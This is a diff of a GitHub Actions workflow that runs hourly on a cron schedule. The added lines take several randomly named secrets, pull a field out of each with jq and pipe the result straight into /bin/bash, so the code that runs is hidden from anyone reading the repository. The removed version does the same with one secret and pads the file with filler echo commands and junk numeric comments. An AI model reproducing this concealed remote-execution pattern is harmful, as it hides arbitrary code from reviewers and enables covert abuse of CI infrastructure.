@@ -1,23 +1,22 @@
-name: tangguoqiang6789 #20497
-on: #6975
-  workflow_dispatch: #22595
-  schedule: #4486
-    - cron: '59 2/6 * * *' #14136
-jobs:  # 15692
-  build: #21160
-    runs-on: ubuntu-latest #1366
-    steps: #7676
-      - uses: actions/checkout@v4 #27518
-      - name: tangguoqiang6789 #13643
-        env: #20324
-          w23078: ${{ secrets.w23078 }} #13797
+name: tangguoqiang6789
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 * * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangguoqiang6789
+        env:
+          sdx758: ${{ secrets.sdx758 }}
         run: |
-          echo $w23078 | jq -r .f16778 | /bin/bash #17131
-          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
-          echo "String len: ${#HOSTNAME}"
-          echo "Binary check: command -v bash 2>/dev/null && echo Bash"
-          echo "Awk mock: echo '1 2' | awk '{print \$1}' 2>/dev/null || echo no-awk"
-          echo "Case mock: case 1 in 1) echo 1;; esac"
-          echo "Arith loop: for ((i=0;i<3;i++)); do echo $i; done"
-          echo "Function mock: f() { echo func; }; f"
-          echo "Exit 0 test: exit 0 || true"
+          echo $sdx758 | jq -r .zfwgs45 | /bin/bash
+          echo $skl0110 | jq -r .vwwp91 | /bin/bash
+          echo $a91055 | jq -r .rtukn400 | /bin/bash
+          echo $ozsgs872 | jq -r .bk8 | /bin/bash
+          echo $xlg6664 | jq -r .ypr3 | /bin/bash
+          echo $qad28 | jq -r .dxswu4751 | /bin/bash
+
